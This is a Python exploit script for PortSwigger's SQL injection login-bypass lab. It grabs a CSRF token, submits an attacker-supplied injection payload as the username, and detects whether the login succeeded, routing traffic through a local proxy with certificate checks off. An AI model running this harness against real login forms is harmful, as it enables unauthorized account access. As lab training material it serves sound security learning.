# PortSwagger || SQLi Lab #2
# Lab link: https://portswigger.net/web-security/sql-injection/lab-login-bypass

import sys
import urllib3
import requests
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"https": "127.0.0.1:8080", "http": "127.0.0.1:8080"}

# first we need to get the CSRF token
def get_csrf(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    paresed_response = BeautifulSoup(r.text, "html.parser")
    csrf = paresed_response.find("input")["value"]
    return csrf


def exploit_sqli(s, url, payload):
    csrf_token = get_csrf(s, url)
    data = {
        "csrf": csrf_token,
        "username": payload,
        "password": "balhblahblah"
    }
    r = s.post(url, data, verify=False, proxies=proxies)

    if "Log out" in r.text:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] incorrect input")
        print("[-] Example: %s <url> <payload>" % sys.argv[0])
    
    s = requests.session()

    if exploit_sqli(s, url, payload):
        print("[+] successful")
    else:
        print("[x] failed")
